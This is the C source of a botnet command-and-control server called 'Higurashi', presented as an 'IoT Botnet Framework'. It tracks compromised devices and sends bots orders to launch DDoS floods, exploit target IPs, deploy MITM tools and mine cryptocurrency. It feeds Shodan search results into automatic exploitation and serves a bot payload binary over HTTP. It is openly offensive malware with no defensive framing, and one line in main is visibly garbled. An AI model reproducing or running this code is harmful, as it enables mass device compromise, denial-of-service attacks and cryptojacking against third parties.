#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <pthread.h>
#include <json-c/json.h>
#include <time.h>
#include <curl/curl.h>
#include <ifaddrs.h>
#include <netdb.h>
#include "config.h"
#include "ascii_art.h"

#define MAX_BOTS 500
#define MAX_SLAVES 50
#define MAX_REPORTS 100
#define HTTP_PORT 8080

// Enhanced ANSI Colors & Styles
#define RESET     "\x1B[0m"
#define BOLD      "\x1B[1m"
#define DIM       "\x1B[2m"
#define UNDERLINE "\x1B[4m"
#define BLINK     "\x1B[5m"
#define REVERSE   "\x1B[7m"

#define BLACK   "\x1B[30m"
#define RED     "\x1B[31m"
#define GREEN   "\x1B[32m"
#define YELLOW  "\x1B[33m"
#define BLUE    "\x1B[34m"
#define MAGENTA "\x1B[35m"
#define CYAN    "\x1B[36m"
#define WHITE   "\x1B[37m"

#define BG_BLACK   "\x1B[40m"
#define BG_RED     "\x1B[41m"
#define BG_GREEN   "\x1B[42m"
#define BG_YELLOW  "\x1B[43m"
#define BG_BLUE    "\x1B[44m"
#define BG_MAGENTA "\x1B[45m"
#define BG_CYAN    "\x1B[46m"
#define BG_WHITE   "\x1B[47m"

// Bright colors
#define BRED    "\x1B[91m"
#define BGREEN  "\x1B[92m"
#define BYELLOW "\x1B[93m"
#define BBLUE   "\x1B[94m"
#define BMAGENTA "\x1B[95m"
#define BCYAN   "\x1B[96m"
#define BWHITE  "\x1B[97m"

// Unicode box drawing characters
#define BOX_TL "╔"  // Top left
#define BOX_TR "╗"  // Top right
#define BOX_BL "╚"  // Bottom left
#define BOX_BR "╝"  // Bottom right
#define BOX_H  "═"  // Horizontal
#define BOX_V  "║"  // Vertical
#define BOX_VR "╠"  // Vertical right
#define BOX_VL "╣"  // Vertical left
#define BOX_HU "╩"  // Horizontal up
#define BOX_HD "╦"  // Horizontal down

// Bot connection type
typedef enum {
    CONN_SSL,
    CONN_TCP
} ConnectionType;

typedef struct {
    SSL *ssl;
    int sock;
    ConnectionType conn_type;
    char ip[INET_ADDRSTRLEN];
    char id[64];
    char arch[32];
    char type[16];
    char os[64];
    int active;
    int compromised_hosts;
    int auto_replicate;
    time_t last_seen;
    time_t connected_at;
} Bot;

typedef struct {
    char ip[INET_ADDRSTRLEN];
    int port;
    int active;
    int bot_count;
} SlaveC2;

typedef struct {
    char bot_id[64];
    char type[32];
    char data[512];
    time_t timestamp;
} Report;

Bot bots[MAX_BOTS];
SlaveC2 slaves[MAX_SLAVES];
Report reports[MAX_REPORTS];
int bot_count = 0;
int slave_count = 0;
int report_count = 0;
int total_compromised = 0;
int reports_received = 0;
pthread_mutex_t bots_mutex = PTHREAD_MUTEX_INITIALIZER;
char local_ip[INET_ADDRSTRLEN] = "127.0.0.1";

// Get local IP address
void get_local_ip() {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) return;
    
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        
        int family = ifa->ifa_addr->sa_family;
        if (family == AF_INET && strcmp(ifa->ifa_name, "lo") != 0) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            inet_ntop(AF_INET, &addr->sin_addr, local_ip, INET_ADDRSTRLEN);
            break;
        }
    }
    freeifaddrs(ifaddr);
}

// Beautiful banner with gradient effect
void print_banner() {
    printf("\033[2J\033[H"); // Clear screen
    printf("\n");
    printf(BMAGENTA BOLD);
    printf("    ██╗  ██╗██╗ ██████╗ ██╗   ██╗██████╗  █████╗ ███╗   ███╗ █████╗ \n");
    printf("    ██║  ██║██║██╔════╝ ██║   ██║██╔══██╗██╔══██╗████╗ ████║██╔══██╗\n");
    printf(MAGENTA);
    printf("    ███████║██║██║  ███╗██║   ██║██████╔╝███████║██╔████╔██║███████║\n");
    printf("    ██╔══██║██║██║   ██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══██║\n");
    printf(CYAN);
    printf("    ██║  ██║██║╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║\n");
    printf("    ╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝\n");
    printf(RESET);
    printf(DIM CYAN "                    ═══ MASTER COMMAND & CONTROL ═══\n" RESET);
    printf(DIM YELLOW "                        IoT Botnet Framework v2.0\n" RESET);
    printf("\n");
}

// Draw a beautiful box
void draw_box(const char *title, int width) {
    printf(CYAN BOLD "%s", BOX_TL);
    for (int i = 0; i < width; i++) printf("%s", BOX_H);
    printf("%s\n", BOX_TR);
    
    if (title) {
        int padding = (width - strlen(title) - 2) / 2;
        printf("%s", BOX_V);
        for (int i = 0; i < padding; i++) printf(" ");
        printf(BWHITE "%s" CYAN, title);
        for (int i = 0; i < width - padding - strlen(title) - 2; i++) printf(" ");
        printf("%s\n", BOX_V);
        
        printf("%s", BOX_VR);
        for (int i = 0; i < width; i++) printf("%s", BOX_H);
        printf("%s\n", BOX_VL);
    }
    printf(RESET);
}

void draw_box_bottom(int width) {
    printf(CYAN BOLD "%s", BOX_BL);
    for (int i = 0; i < width; i++) printf("%s", BOX_H);
    printf("%s\n" RESET, BOX_BR);
}

// Enhanced dashboard
void display_dashboard() {
    print_banner();
    
    // Server info box
    draw_box("SERVER STATUS", 70);
    printf(CYAN BOLD "%s" RESET " " YELLOW "IP: " BWHITE "%s" RESET " │ " 
           YELLOW "Port: " BWHITE "%d" RESET " │ " 
           YELLOW "HTTP: " BWHITE "%d" RESET " │ " 
           YELLOW "Uptime: " BGREEN "Active" RESET "\n",
           BOX_V, local_ip, C2_PORT, HTTP_PORT);
    draw_box_bottom(70);
    printf("\n");
    
    // Statistics
    int higurashi_count = 0, vivi_count = 0, slave_c2_count = 0;
    int ssl_count = 0, tcp_count = 0;
    
    pthread_mutex_lock(&bots_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].active) continue;
        if (strcmp(bots[i].type, "higurashi") == 0) higurashi_count++;
        else if (strcmp(bots[i].type, "vivi") == 0) vivi_count++;
        else if (strcmp(bots[i].type, "slave_c2") == 0) slave_c2_count++;
        
        if (bots[i].conn_type == CONN_SSL) ssl_count++;
        else tcp_count++;
    }
    pthread_mutex_unlock(&bots_mutex);
    
    draw_box("NETWORK STATISTICS", 70);
    printf(CYAN BOLD "%s" RESET, BOX_V);
    printf(" " BGREEN "●" RESET " Higurashi Soldiers: " BWHITE BOLD "%3d" RESET 
           " │ " BMAGENTA "●" RESET " Vivi Extensions: " BWHITE BOLD "%3d" RESET 
           " │ " BCYAN "●" RESET " Slave C2: " BWHITE BOLD "%2d" RESET " " 
           CYAN BOLD "%s" RESET "\n", 
           higurashi_count, vivi_count, slave_c2_count, BOX_V);
    
    printf(CYAN BOLD "%s" RESET, BOX_V);
    printf(" " YELLOW "⚡" RESET " SSL Connections: " BGREEN BOLD "%3d" RESET 
           " │ " YELLOW "⚡" RESET " TCP Connections: " BYELLOW BOLD "%3d" RESET 
           " │ " RED "♦" RESET " Total: " BRED BOLD "%3d" RESET "  " 
           CYAN BOLD "%s" RESET "\n",
           ssl_count, tcp_count, bot_count, BOX_V);
    
    printf(CYAN BOLD "%s" RESET, BOX_V);
    printf(" " BRED "⚔" RESET "  Devices Compromised: " BRED BOLD "%4d" RESET 
           " │ " BBLUE "📊" RESET " Reports: " BBLUE BOLD "%4d" RESET 
           "                  " CYAN BOLD "%s" RESET "\n",
           total_compromised, reports_received, BOX_V);
    draw_box_bottom(70);
    printf("\n");
    
    // Active bots table
    draw_box("ACTIVE BOTS", 70);
    printf(CYAN BOLD "%s" RESET " " DIM "#  │ Type      │ ID            │ IP             │ Arch   │ Conn" RESET " " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET, BOX_VR);
    for (int i = 0; i < 70; i++) printf(DIM "%s" RESET, BOX_H);
    printf(CYAN BOLD "%s" RESET "\n", BOX_VL);
    
    pthread_mutex_lock(&bots_mutex);
    int displayed = 0;
    for (int i = 0; i < bot_count && displayed < 15; i++) {
        if (bots[i].active) {
            char type_icon[8];
            char type_color[16];
            
            if (strcmp(bots[i].type, "higurashi") == 0) {
                strcpy(type_icon, "⚔");
                strcpy(type_color, BGREEN);
            } else if (strcmp(bots[i].type, "vivi") == 0) {
                strcpy(type_icon, "♠");
                strcpy(type_color, BMAGENTA);
            } else {
                strcpy(type_icon, "▣");
                strcpy(type_color, BCYAN);
            }
            
            char conn_badge[16];
            if (bots[i].conn_type == CONN_SSL) {
                snprintf(conn_badge, sizeof(conn_badge), "%s🔒SSL%s", BGREEN, RESET);
            } else {
                snprintf(conn_badge, sizeof(conn_badge), "%s⚡TCP%s", BYELLOW, RESET);
            }
            
            printf(CYAN BOLD "%s" RESET " %s%-2d%s │ %s%s %-7s%s │ %-13.13s │ %-14s │ %-6s │ %s " 
                   CYAN BOLD "%s" RESET "\n",
                   BOX_V,
                   BWHITE, i + 1, RESET,
                   type_color, type_icon, bots[i].type, RESET,
                   bots[i].id,
                   bots[i].ip,
                   bots[i].arch,
                   conn_badge,
                   BOX_V);
            displayed++;
        }
    }
    pthread_mutex_unlock(&bots_mutex);
    
    if (displayed == 0) {
        printf(CYAN BOLD "%s" RESET " " DIM "No active bots connected yet..." RESET "                                        " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    }
    draw_box_bottom(70);
    printf("\n");
    
    // Recent reports
    draw_box("RECENT ACTIVITY", 70);
    if (report_count > 0) {
        int start = (report_count > 8) ? report_count - 8 : 0;
        for (int i = start; i < report_count; i++) {
            char time_str[32];
            struct tm *tm_info = localtime(&reports[i].timestamp);
            strftime(time_str, sizeof(time_str), "%H:%M:%S", tm_info);
            
            char type_icon[8];
            char type_color[16];
            if (strstr(reports[i].type, "exploit")) {
                strcpy(type_icon, "⚔");
                strcpy(type_color, BRED);
            } else if (strstr(reports[i].type, "scan")) {
                strcpy(type_icon, "🔍");
                strcpy(type_color, BYELLOW);
            } else if (strstr(reports[i].type, "mining")) {
                strcpy(type_icon, "⛏");
                strcpy(type_color, BGREEN);
            } else {
                strcpy(type_icon, "ℹ");
                strcpy(type_color, BCYAN);
            }
            
            printf(CYAN BOLD "%s" RESET " " DIM "[%s]" RESET " %s%s%s " BWHITE "[%.12s]" RESET " %.30s " 
                   CYAN BOLD "%s" RESET "\n",
                   BOX_V, time_str,
                   type_color, type_icon, RESET,
                   reports[i].bot_id, reports[i].data, BOX_V);
        }
    } else {
        printf(CYAN BOLD "%s" RESET " " DIM "No activity yet..." RESET "                                                    " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    }
    draw_box_bottom(70);
    printf("\n");
    
    // Commands help
    draw_box("AVAILABLE COMMANDS", 70);
    printf(CYAN BOLD "%s" RESET " " BGREEN "list" RESET "           - List all active bots                               " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET " " BGREEN "status" RESET " <num>   - Show detailed status of bot #num                  " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET " " BYELLOW "scan" RESET " <num>     - Order bot #num to scan local network             " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET " " BRED "attack" RESET " <num> <ip> <port> <time> - Launch DDoS attack         " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET " " BRED "exploit" RESET " <num> <ip> - Exploit specific target                   " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET " " BMAGENTA "deploy" RESET " <num> <ip>  - Deploy Vivi MITM on target                 " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET " " BGREEN "mine" RESET " <num>      - Start cryptocurrency mining on bot           " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET " " BCYAN "shodan" RESET " <query> - Search Shodan and auto-attack results         " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    printf(CYAN BOLD "%s" RESET " " BWHITE "http" RESET "           - Start HTTP payload server (port %d)             " CYAN BOLD "%s" RESET "\n", BOX_V, HTTP_PORT, BOX_V);
    printf(CYAN BOLD "%s" RESET " " RED "exit" RESET "           - Shutdown C2 server                               " CYAN BOLD "%s" RESET "\n", BOX_V, BOX_V);
    draw_box_bottom(70);
    
    printf("\n" BMAGENTA BOLD "╭─[ " BWHITE "Commander" BMAGENTA " ]─[" BCYAN " %s:%d" BMAGENTA " ]\n", local_ip, C2_PORT);
    printf("╰─> " RESET);
    fflush(stdout);
}

// Shodan integration (unchanged but with prettier output)
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    char *data = (char *)userp;
    strncat(data, contents, realsize);
    return realsize;
}

void shodan_search(const char *query) {
    printf(BYELLOW "⏳ Searching Shodan for: %s%s\n", query, RESET);
    
    CURL *curl = curl_easy_init();
    if (!curl) {
        printf(BRED "✗ Failed to initialize curl\n" RESET);
        return;
    }
    
    char url[512];
    snprintf(url, sizeof(url),
        "https://api.shodan.io/shodan/host/search?key=YOUR_SHODAN_KEY&query=%s",
        query);
    
    char response[8192] = {0};
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    
    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        json_object *jobj = json_tokener_parse(response);
        if (jobj) {
            json_object *matches;
            if (json_object_object_get_ex(jobj, "matches", &matches)) {
                int len = json_object_array_length(matches);
                printf(BGREEN "✓ Found %d targets!\n" RESET, len);
                
                // Distribute to available Higurashi bots
                pthread_mutex_lock(&bots_mutex);
                int bot_index = 0;
                for (int i = 0; i < len && i < 50; i++) {
                    json_object *match = json_object_array_get_idx(matches, i);
                    json_object *ip_obj;
                    if (json_object_object_get_ex(match, "ip_str", &ip_obj)) {
                        const char *target_ip = json_object_get_string(ip_obj);
                        
                        // Find next available Higurashi bot
                        for (int j = bot_index; j < bot_count; j++) {
                            if (bots[j].active && strcmp(bots[j].type, "higurashi") == 0) {
                                json_object *cmd = json_object_new_object();
                                json_object_object_add(cmd, "action", json_object_new_string("exploit"));
                                json_object_object_add(cmd, "target", json_object_new_string(target_ip));
                                
                                const char *json_str = json_object_to_json_string(cmd);
                                if (bots[j].conn_type == CONN_SSL) {
                                    SSL_write(bots[j].ssl, json_str, strlen(json_str));
                                } else {
                                    send(bots[j].sock, json_str, strlen(json_str), 0);
                                }
                                json_object_put(cmd);
                                
                                printf(BCYAN "  → Assigned %s to bot #%d\n" RESET, target_ip, j + 1);
                                bot_index = (j + 1) % bot_count;
                                break;
                            }
                        }
                    }
                }
                pthread_mutex_unlock(&bots_mutex);
            }
            json_object_put(jobj);
        }
    } else {
        printf(BRED "✗ Shodan request failed\n" RESET);
    }
    curl_easy_cleanup(curl);
}

// HTTP server for serving payloads
void *http_server_thread(void *arg) {
    (void)arg;
    
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(server_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        return NULL;
    }
    
    listen(server_sock, 10);
    
    printf(BGREEN "✓ HTTP payload server started on port %d\n" RESET, HTTP_PORT);
    
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t len = sizeof(client_addr);
        int client = accept(server_sock, (struct sockaddr*)&client_addr, &len);
        
        if (client < 0) continue;
        
        char buffer[2048];
        int bytes = recv(client, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            
            // Parse HTTP request
            if (strstr(buffer, "GET /higurashi_mini")) {
                FILE *fp = fopen("higurashi_mini", "rb");
                if (fp) {
                    fseek(fp, 0, SEEK_END);
                    long size = ftell(fp);
                    fseek(fp, 0, SEEK_SET);
                    
                    char header[512];
                    snprintf(header, sizeof(header),
                        "HTTP/1.1 200 OK\r\n"
                        "Content-Type: application/octet-stream\r\n"
                        "Content-Length: %ld\r\n"
                        "Connection: close\r\n\r\n", size);
                    send(client, header, strlen(header), 0);
                    
                    char file_buffer[4096];
                    size_t n;
                    while ((n = fread(file_buffer, 1, sizeof(file_buffer), fp)) > 0) {
                        send(client, file_buffer, n, 0);
                    }
                    fclose(fp);
                    
                    char client_ip[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
                    printf(BCYAN "⇩ Served higurashi_mini to %s\n" RESET, client_ip);
                }
            } else {
                char *response = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n404 Not Found";
                send(client, response, strlen(response), 0);
            }
        }
        close(client);
    }
    
    close(server_sock);
    return NULL;
}

// SSL context creation
SSL_CTX *create_context() {
    const SSL_METHOD *method = TLS_server_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

void configure_context(SSL_CTX *ctx) {
    if (SSL_CTX_use_certificate_file(ctx, "server.crt", SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(ctx, "server.key", SSL_FILETYPE_PEM) <= 0) {
        fprintf(stderr, BRED "✗ SSL certificate not found. SSL connections disabled.\n" RESET);
    }
}

// Handle bot connection (both SSL and TCP)
void *handle_bot(void *arg) {
    Bot *bot_info = (Bot *)arg;
    SSL *ssl = bot_info->ssl;
    int sock = bot_info->sock;
    ConnectionType conn_type = bot_info->conn_type;
    
    pthread_mutex_lock(&bots_mutex);
    int current_bot_index = bot_count;
    memcpy(&bots[current_bot_index], bot_info, sizeof(Bot));
    bots[current_bot_index].active = 1;
    bots[current_bot_index].connected_at = time(NULL);
    bot_count++;
    pthread_mutex_unlock(&bots_mutex);
    
    free(bot_info);
    
    char buf[8192];
    while (1) {
        int bytes;
        if (conn_type == CONN_SSL) {
            bytes = SSL_read(ssl, buf, sizeof(buf) - 1);
        } else {
            bytes = recv(sock, buf, sizeof(buf) - 1, 0);
        }
        
        if (bytes > 0) {
            buf[bytes] = '\0';
            bots[current_bot_index].last_seen = time(NULL);
            
            // Try to parse as JSON first
            json_object *jobj = json_tokener_parse(buf);
            if (jobj) {
                // Handle JSON messages (from higurashi full version)
                json_object *action_obj;
                if (json_object_object_get_ex(jobj, "action", &action_obj)) {
                    const char *action = json_object_get_string(action_obj);
                    
                    if (strcmp(action, "handshake") == 0) {
                        json_object *id_obj, *arch_obj, *type_obj, *os_obj;
                        
                        if (json_object_object_get_ex(jobj, "id", &id_obj)) {
                            strncpy(bots[current_bot_index].id, json_object_get_string(id_obj), 63);
                        }
                        if (json_object_object_get_ex(jobj, "arch", &arch_obj)) {
                            strncpy(bots[current_bot_index].arch, json_object_get_string(arch_obj), 31);
                        }
                        if (json_object_object_get_ex(jobj, "type", &type_obj)) {
                            strncpy(bots[current_bot_index].type, json_object_get_string(type_obj), 15);
                        }
                        if (json_object_object_get_ex(jobj, "os", &os_obj)) {
                            strncpy(bots[current_bot_index].os, json_object_get_string(os_obj), 63);
                        }
                        
                        if (strcmp(bots[current_bot_index].type, "higurashi") == 0) {
                            show_replication_animation();
                        }
                        
                        display_dashboard();
                    } else if (strcmp(action, "report") == 0) {
                        json_object *type_obj, *data_obj;
                        if (json_object_object_get_ex(jobj, "type", &type_obj) &&
                            json_object_object_get_ex(jobj, "data", &data_obj)) {
                            
                            if (report_count < MAX_REPORTS) {
                                strncpy(reports[report_count].bot_id, bots[current_bot_index].id, 63);
                                strncpy(reports[report_count].type, json_object_get_string(type_obj), 31);
                                strncpy(reports[report_count].data, json_object_get_string(data_obj), 511);
                                reports[report_count].timestamp = time(NULL);
                                report_count++;
                                reports_received++;
                            }
                        }
                        display_dashboard();
                    }
                }
                json_object_put(jobj);
            } else {
                // Handle plain text messages (from higurashi_mini)
                // Format: "HIGURASHI|bot_id|arch|os" or "REPORT|bot_id|message"
                if (strncmp(buf, "HIGURASHI|", 10) == 0) {
                    char *token = strtok(buf + 10, "|");
                    if (token) strncpy(bots[current_bot_index].id, token, 63);
                    
                    token = strtok(NULL, "|");
                    if (token) strncpy(bots[current_bot_index].arch, token, 31);
                    
                    token = strtok(NULL, "|");
                    if (token) strncpy(bots[current_bot_index].os, token, 63);
                    
                    strcpy(bots[current_bot_index].type, "higurashi");
                    
                    show_replication_animation();
                    display_dashboard();
                } else if (strncmp(buf, "REPORT|", 7) == 0) {
                    char *bot_id = strtok(buf + 7, "|");
                    char *message = strtok(NULL, "\n");
                    
                    if (bot_id && message && report_count < MAX_REPORTS) {
                        strncpy(reports[report_count].bot_id, bot_id, 63);
                        strcpy(reports[report_count].type, "info");
                        strncpy(reports[report_count].data, message, 511);
                        reports[report_count].timestamp = time(NULL);
                        report_count++;
                        reports_received++;
                        display_dashboard();
                    }
                } else if (strncmp(buf, "PING", 4) == 0) {
                    // Just keepalive, update last_seen
                    bots[current_bot_index].last_seen = time(NULL);
                }
            }
        } else {
            break;
        }
    }
    
    bots[current_bot_index].active = 0;
    if (conn_type == CONN_SSL && ssl) {
        SSL_free(ssl);
    }
    if (sock >= 0) {
        close(sock);
    }
    
    display_dashboard();
    return NULL;
}

// Command interface thread
void *command_thread(void *arg) {
    (void)arg;
    char cmd_buffer[1024];
    
    while (1) {
        if (!fgets(cmd_buffer, sizeof(cmd_buffer), stdin)) break;
        cmd_buffer[strcspn(cmd_buffer, "\n")] = '\0';
        
        if (strlen(cmd_buffer) == 0) {
            display_dashboard();
            continue;
        }
        
        char *command = strtok(cmd_buffer, " ");
        if (!command) {
            display_dashboard();
            continue;
        }
        
        if (strcmp(command, "exit") == 0) {
            printf(BRED "⚠ Shutting down C2...\n" RESET);
            exit(0);
        } else if (strcmp(command, "list") == 0) {
            display_dashboard();
        } else if (strcmp(command, "http") == 0) {
            pthread_t http_tid;
            if (pthread_create(&http_tid, NULL, http_server_thread, NULL) == 0) {
                pthread_detach(http_tid);
            }
        } else if (strcmp(command, "scan") == 0) {
            char *bot_num_str = strtok(NULL, " ");
            if (bot_num_str) {
                int bot_num = atoi(bot_num_str) - 1;
                pthread_mutex_lock(&bots_mutex);
                if (bot_num >= 0 && bot_num < bot_count && bots[bot_num].active) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("recon"));
                    const char *json_str = json_object_to_json_string(cmd);
                    
                    if (bots[bot_num].conn_type == CONN_SSL) {
                        SSL_write(bots[bot_num].ssl, json_str, strlen(json_str));
                    } else {
                        send(bots[bot_num].sock, json_str, strlen(json_str), 0);
                    }
                    json_object_put(cmd);
                    printf(BGREEN "✓ Scan order sent to bot #%d\n" RESET, bot_num + 1);
                } else {
                    printf(BRED "✗ Invalid bot number\n" RESET);
                }
                pthread_mutex_unlock(&bots_mutex);
            }
            display_dashboard();
        } else if (strcmp(command, "attack") == 0) {
            char *bot_num_str = strtok(NULL, " ");
            char *target_ip = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            
            if (bot_num_str && target_ip && port_str && duration_str) {
                int bot_num = atoi(bot_num_str) - 1;
                int port = atoi(port_str);
                int duration = atoi(duration_str);
                
                pthread_mutex_lock(&bots_mutex);
                if (bot_num >= 0 && bot_num < bot_count && bots[bot_num].active) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("attack"));
                    json_object_object_add(cmd, "target", json_object_new_string(target_ip));
                    json_object_object_add(cmd, "port", json_object_new_int(port));
                    json_object_object_add(cmd, "duration", json_object_new_int(duration));
                    
                    const char *json_str = json_object_to_json_string(cmd);
                    if (bots[bot_num].conn_type == CONN_SSL) {
                        SSL_write(bots[bot_num].ssl, json_str, strlen(json_str));
                    } else {
                        send(bots[bot_num].sock, json_str, strlen(json_str), 0);
                    }
                    json_object_put(cmd);
                    printf(BRED "⚔ DDoS attack launched: %s:%d for %ds\n" RESET, target_ip, port, duration);
                } else {
                    printf(BRED "✗ Invalid bot number\n" RESET);
                }
                pthread_mutex_unlock(&bots_mutex);
            } else {
                printf(BYELLOW "Usage: attack <bot_num> <target_ip> <port> <duration>\n" RESET);
            }
            display_dashboard();
        } else if (strcmp(command, "exploit") == 0) {
            char *bot_num_str = strtok(NULL, " ");
            char *target_ip = strtok(NULL, " ");
            
            if (bot_num_str && target_ip) {
                int bot_num = atoi(bot_num_str) - 1;
                pthread_mutex_lock(&bots_mutex);
                if (bot_num >= 0 && bot_num < bot_count && bots[bot_num].active) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("exploit"));
                    json_object_object_add(cmd, "target", json_object_new_string(target_ip));
                    
                    const char *json_str = json_object_to_json_string(cmd);
                    if (bots[bot_num].conn_type == CONN_SSL) {
                        SSL_write(bots[bot_num].ssl, json_str, strlen(json_str));
                    } else {
                        send(bots[bot_num].sock, json_str, strlen(json_str), 0);
                    }
                    json_object_put(cmd);
                    printf(BRED "⚔ Exploit order sent to bot #%d → %s\n" RESET, bot_num + 1, target_ip);
                } else {
                    printf(BRED "✗ Invalid bot number\n" RESET);
                }
                pthread_mutex_unlock(&bots_mutex);
            } else {
                printf(BYELLOW "Usage: exploit <bot_num> <target_ip>\n" RESET);
            }
            display_dashboard();
        } else if (strcmp(command, "mine") == 0) {
            char *bot_num_str = strtok(NULL, " ");
            if (bot_num_str) {
                int bot_num = atoi(bot_num_str) - 1;
                pthread_mutex_lock(&bots_mutex);
                if (bot_num >= 0 && bot_num < bot_count && bots[bot_num].active) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("mine"));
                    
                    const char *json_str = json_object_to_json_string(cmd);
                    if (bots[bot_num].conn_type == CONN_SSL) {
                        SSL_write(bots[bot_num].ssl, json_str, strlen(json_str));
                    } else {
                        send(bots[bot_num].sock, json_str, strlen(json_str), 0);
                    }
                    json_object_put(cmd);
                    printf(BGREEN "⛏ Mining started on bot #%d\n" RESET, bot_num + 1);
                } else {
                    printf(BRED "✗ Invalid bot number\n" RESET);
                }
                pthread_mutex_unlock(&bots_mutex);
            }
            display_dashboard();
        } else if (strcmp(command, "shodan") == 0) {
            char *query = strtok(NULL, "");
            if (query) {
                shodan_search(query);
            } else {
                printf(BYELLOW "Usage: shodan <query>\n" RESET);
            }
            display_dashboard();
        } else {
            printf(BRED "✗ Unknown command. Type 'list' to see available commands.\n" RESET);
            display_dashboard();
        }
    }
    return NULL;
}

int main() {
    // Initialize
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    get_local_ip();
    
    SSL_CTX *ctx = create_context();
    configure_context(ctx);
    
    // Create main socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf(BRED "✗ Failed to bind to port %d\n" RESET, C2_PORT);
        return 1;
    }
    
    listen(sock, 50);
    
    display_dashboard();
    
    // Start command thread
    pthread_t cmd_tid;
    pthread_create(&cmd_tid, NULL, command_thread, NULL);
    
    // Accept connections
    while (1) {
        struct sockaddr_in client_addr;
        socklen_client_addr);
        
        if (client < 0) continue;
        
        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
        
        // Try SSL first
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, client);
        
        Bot *bot_info = (Bot *)calloc(1, sizeof(Bot));
        strncpy(bot_info->ip, client_ip, INET_ADDRSTRLEN - 1);
        
        if (SSL_accept(ssl) > 0) {
            // SSL connection successful
            bot_info->ssl = ssl;
            bot_info->sock = client;
            bot_info->conn_type = CONN_SSL;
        } else {
            // SSL failed, assume TCP plain
            SSL_free(ssl);
            bot_info->ssl = NULL;
            bot_info->sock = client;
            bot_info->conn_type = CONN_TCP;
        }
        
        pthread_t bot_tid;
        pthread_create(&bot_tid, NULL, handle_bot, bot_info);
        pthread_detach(bot_tid);
    }
    
    close(sock);
    SSL_CTX_free(ctx);
    curl_global_cleanup();
    return 0;
}
